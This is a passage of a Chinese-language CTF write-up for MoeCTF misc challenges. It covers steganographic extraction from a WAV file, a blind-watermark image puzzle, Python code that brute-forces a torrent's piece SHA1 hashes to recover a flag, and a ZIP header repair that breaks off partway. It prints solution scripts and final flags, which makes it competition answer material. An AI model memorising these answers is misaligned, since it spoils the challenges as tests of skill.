&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F5AFSmespbdsjMbGihMXM%252F%25E4%25BD%25A0%25E6%2583%25B3%25E8%25A6%2581flag%25E5%2590%2597-1.png%3Falt%3Dmedia%26token%3D2015e248-017e-4bb6-90c5-8a68a6ff7efc&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=8048d37bfb8b448dbaabf00a661a3d6628f452002938151b8d305625bf9b0948&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ steghide extract -sf 1.WAV -p youseeme -xf out
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;wrote extracted data to &amp;quot;out&amp;quot;.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ file out
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;out: ASCII text, with no line terminators
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ cat out
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;U2FsdGVkX18pGLCTMBSjkndoY4gf2lbG96QwOzVZDZeAYOA+TKnfv1mCtQ==
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Rabbit 解密 &lt;code&gt;key:Bulbasaur&lt;&#x2F;code&gt; 可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Mu5ic_1s_v3ry_1nt23esting_!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;zhao-pian-chong-xi&quot;&gt;照片冲洗&lt;a class=&quot;zola-anchor&quot; href=&quot;#zhao-pian-chong-xi&quot; aria-label=&quot;Anchor link for: zhao-pian-chong-xi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;下载附件后用 010 打开可以发现下方存在另外一张图片&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FShBYGe2g31sW4X87chp6%252F%25E7%2585%25A7%25E7%2589%2587%25E5%2586%25B2%25E6%25B4%2597-1.png%3Falt%3Dmedia%26token%3D2d1bcb86-fdee-4566-93be-c10b6c3d133e&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=7e8e638f27d0174c30e40c2b6af94a908aa20fde5f984d880f85c091564b0752&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;将上下两张图片分别提取出来如下图所示&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FOwCZBKp11tEdoBr0wb5i%252F%25E7%2585%25A7%25E7%2589%2587%25E5%2586%25B2%25E6%25B4%2597-2.png%3Falt%3Dmedia%26token%3D40836d91-94b5-4727-8970-760fa291e643&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=4ba900f66332fa5243bd8b0107342e8dfeecc0794eb512cfad0041818514064a&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;结合题目描述得知这是一道盲水印题目，推断 &lt;code&gt;2.png&lt;&#x2F;code&gt; 是原图，&lt;code&gt;1.png&lt;&#x2F;code&gt; 是水印图。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;linyacool&#x2F;blind-watermark&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;chishaxie&#x2F;BlindWaterMark&lt;&#x2F;p&gt;
&lt;p&gt;盲水印脚本有多种，并且 Python 2 和 Python 3 的解题结果不同，可以多尝试&lt;&#x2F;p&gt;
&lt;p&gt;这题解出来使用的是第一个 URL 的 Python 3 脚本&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过盲水印脚本可以解出 flag，先通过 pip 安装库&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ pip install opencv-python
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;之后通过以下指令即可解出水印图如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python decode.py --original 2.png --image 1.png --result flag.png
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F9xZHG4PxlfJGIf1tKdqZ%252F%25E7%2585%25A7%25E7%2589%2587%25E5%2586%25B2%25E6%25B4%2597-3.png%3Falt%3Dmedia%26token%3D6f9fe2e7-114d-41e4-acfc-13bbde62724e&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=fa65951bfbe1b5c2870adf50b3ce27be85d28937c5356673ad04fd4141b4940e&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;读出来即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{W0w_you_6@v3_1earn3d_blind_w@t3rma2k}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;magnet-network&quot;&gt;magnet_network&lt;a class=&quot;zola-anchor&quot; href=&quot;#magnet-network&quot; aria-label=&quot;Anchor link for: magnet-network&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.snowywar.top&#x2F;?p=1118&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;用 010 打开压缩包查看文件头 &lt;code&gt;28 B5 2F FD 00 58 8D 17&lt;&#x2F;code&gt; 发现并不是 &lt;code&gt;zip&lt;&#x2F;code&gt; 压缩包文件头格式，用 &lt;code&gt;file challenge.zip&lt;&#x2F;code&gt; 看一下发现 &lt;code&gt;Zstandard compressed data (v0.8+)&lt;&#x2F;code&gt; ，通过咕鸽可以找到解压缩方法。&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;先修改后缀为 &lt;code&gt;.zst&lt;&#x2F;code&gt;；&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;执行 &lt;code&gt;zstd -d challenge.zst&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;解压完就可以得到一个新的压缩包，里面存在一个 &lt;code&gt;segments.torrent&lt;&#x2F;code&gt; 文件，可以使用 Python 的 bencode 进行分析，先安装好环境。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;apt-get update
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;python3 -m pip install --upgrade pip
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;python3 -m pip install --upgrade pwntools==4.9.0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;python3 -m pip install --upgrade bencode.py==4.0.0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import bencode
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;torrent_file = open(&amp;quot;segments.torrent&amp;quot;, &amp;quot;rb&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;metainfo = bencode.bdecode(torrent_file.read())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(metainfo)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# {b&amp;#39;comment&amp;#39;: b&amp;#39;flag format: moectf{xxxxxx}\nlength of xxxxxx: 24\nsha256 of flag: de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584\nflag chars: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_? &amp;#39;, b&amp;#39;created by&amp;#39;: b&amp;#39;qBittorrent v4.5.4.10&amp;#39;, b&amp;#39;creation date&amp;#39;: 1691855086, b&amp;#39;info&amp;#39;: {b&amp;#39;files&amp;#39;: [{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;1&amp;#39;]}, {b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;0&amp;#39;]}, {b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;3&amp;#39;]}, {b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;1&amp;#39;]}, {b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;5&amp;#39;]}, {b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;2&amp;#39;]}, {b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;2&amp;#39;]}, {b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;3&amp;#39;]}, {b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;6&amp;#39;]}, {b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;4&amp;#39;]}, {b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;4&amp;#39;]}], b&amp;#39;name&amp;#39;: b&amp;#39;segments&amp;#39;, b&amp;#39;piece length&amp;#39;: 16384, b&amp;#39;pieces&amp;#39;: b&amp;#39;:\xca\xd9n\xe55E\xf8\xad&amp;lt;A\x9c[\x19e\xbe\xa24\xccj\xb39\xe2T~\x1b\xb5\xc1\xe5l*\xce\xab\x1f|\xf5\xaf\x93\xd1=e\x13\x1d\xbau\x0f\xdc\xb7\x15\xe3#Q\x07\x04\x1d\xe9\xc7\x96q\xae\xd3\xbae;\x9d)TKb9\x02\xaa\x07\x07D\x92y&amp;lt;z\xd4M\xd6\xe8\x92\xd9%\xa7A\x1c\xb1g{\x8b]\x8f\xecm\x93\x08\xac\xcc\x83\x04~\x9a\xe3\x92\xe0+PD(&amp;lt;\x89\xf1m\xc2o2\x8e&amp;#39;}}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;整理出注释内容
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag format: moectf{xxxxxx}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;length of xxxxxx: 24
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sha256 of flag: de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag chars: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_? 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 整理出 files 内容
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;info = metainfo[b&amp;#39;info&amp;#39;][b&amp;#39;files&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for file in info:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(file)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;1&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;0&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;3&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;1&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;5&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;2&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;2&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;3&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;6&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;attr&amp;#39;: b&amp;#39;p&amp;#39;, b&amp;#39;length&amp;#39;: 16380, b&amp;#39;path&amp;#39;: [b&amp;#39;.pad&amp;#39;, b&amp;#39;4&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{b&amp;#39;length&amp;#39;: 4, b&amp;#39;path&amp;#39;: [b&amp;#39;4&amp;#39;]}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;从 &lt;code&gt;files&lt;&#x2F;code&gt; 可以得知一共有 6 个文件，并且注释中提示 flag 的长度为 24，并且 &lt;code&gt;files&lt;&#x2F;code&gt; 中的每个文件都是 4 个字节的实际长度，另外用 &lt;code&gt;.pad&lt;&#x2F;code&gt; 进行填充 16380 字节使得每个文件均为 16KB。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;在BitTorrent协议中，文件被分为多个块或片段，每个片段的大小由 &lt;code&gt;piece length&lt;&#x2F;code&gt; 字段定义。为了验证下载的数据的完整性，BitTorrent使用 &lt;code&gt;pieces&lt;&#x2F;code&gt; 字段存储每个片段的SHA1哈希值。&lt;&#x2F;p&gt;
&lt;p&gt;为了计算某个特定片段的SHA1哈希值，你需要先获取该片段的原始数据内容，然后对这部分数据使用SHA1算法。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;因此我们可以通过破解 SHA1 哈希值来获得 flag 的 4 个字节，在 6 个文件中，最后一个并没有使用 &lt;code&gt;.pad&lt;&#x2F;code&gt; 填充（由于不知道填充内容是什么，先用 &lt;code&gt;\x00&lt;&#x2F;code&gt; 尝试），可以通过 &lt;code&gt;hashcat&lt;&#x2F;code&gt; 直接暴力解出来 &lt;code&gt;eSti&lt;&#x2F;code&gt; ，而其他的需要在尾部加上 16380 个 &lt;code&gt;\x00&lt;&#x2F;code&gt; 才可以，尝试过跑字典发现行不了，跑到前一些就已经 79G 了，tkbl。也尝试过写个 rule ，但是 hashcat 读不了，因此还是得使用 Python 来写。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import hashlib
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import bencode
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from pwn import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;torrent_file = open(&amp;quot;segments.torrent&amp;quot;, &amp;quot;rb&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;metainfo = bencode.bdecode(torrent_file.read())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;torrent_file.close()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pieces = metainfo[&amp;#39;info&amp;#39;][&amp;#39;pieces&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hashes_bytes = [pieces[i:i + 20] for i in range(0, len(pieces), 20)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hashes = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for _, h in enumerate(hashes_bytes):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    hashes.append(h.hex())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;result = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for ha5h in hashes[:5]:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    index = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    result.append(iters.mbruteforce(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        lambda x: hashlib.sha1((x+&amp;quot;\x00&amp;quot;*16380).encode()).hexdigest() == ha5h,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_?&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        4,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;#39;fixed&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    index += 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;result.append(iters.mbruteforce(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        lambda x: hashlib.sha1((x).encode()).hexdigest() == hashes[5],
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!_?&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        4,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;#39;fixed&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag = result[0] + result[3] + result[1] + result[5] + result[2] + result[4]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(result)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(hashlib.sha256((&amp;#39;moectf{&amp;#39;+flag+&amp;#39;}&amp;#39;).encode()).hexdigest())
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后运行一下！&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python3 buu-new.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;p2p_&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;nter&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;ng_2&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;iS_i&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;WPIB&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] MBruteforcing: Found key: &amp;quot;eSti&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[&amp;#39;p2p_&amp;#39;, &amp;#39;nter&amp;#39;, &amp;#39;ng_2&amp;#39;, &amp;#39;iS_i&amp;#39;, &amp;#39;WPIB&amp;#39;, &amp;#39;eSti&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p2p_iS_intereSting_2WPIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;de5d94f22a9b8eab09779102a0fcc9c566880f7807d359da6f27723f3b881584
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;就可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{p2p_iS_intereSting_2WPIB}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;weird-package&quot;&gt;weird_package&lt;a class=&quot;zola-anchor&quot; href=&quot;#weird-package&quot; aria-label=&quot;Anchor link for: weird-package&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;根据题目得知需要先修复压缩包，先用 010 打开该文件&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FtF1HbdPhAEJNswGoUqld%252Fweird_package-2.png%3Falt%3Dmedia%26token%3Dcc25397c-a7ec-48b2-a7ce-08b554264d9f&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=4287b24d3d9a538962341ce0dfc759e1352e1e5bc23c53214eaa1a074545dcf5&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以发现 ZIPDIRENTRY 是损坏的，我们需要根据上面的 record 对 ZIPDIRENTRY 进行修复。&lt;&#x2F;p&gt;
&lt;p&gt;先从 dirEntry[0] 开始，它对应的是 record[0] 。通过 dirEntry[0] 的 deFileNameLength 为 2 可以推断出他的文件名就是 record[0] 的文件名需要将 deFileName 改为 &lt;code&gt;3&#x2F;&lt;&#x2F;code&gt; 即可，如下图所示&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F7BMs6E1aUZwbp1Hwmumq%252Fweird_package-3.png%3Falt%3Dmedia%26token%3Dfd051e47-1d12-4fb8-9821-7a8e3bbe7307&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=ebf735ddca3090baa1264f0fd605e19bede8296158470b9ad952eb169f80593f&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;以此类推，将 dirEntry[0] 到 dirEntry[8] 都恢复好，可以得到以下内容。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F2vJUVlMeHtTEfOQOxKv1%252Fweird_package-4.png%3Falt%3Dmedia%26token%3Da0f32fdc-eace-46a8-bc9d-575edbf77f28&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=6dca8229aeae3b54c2fb164e3e532b4a982a9eec47d33a62320954204eced16d&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
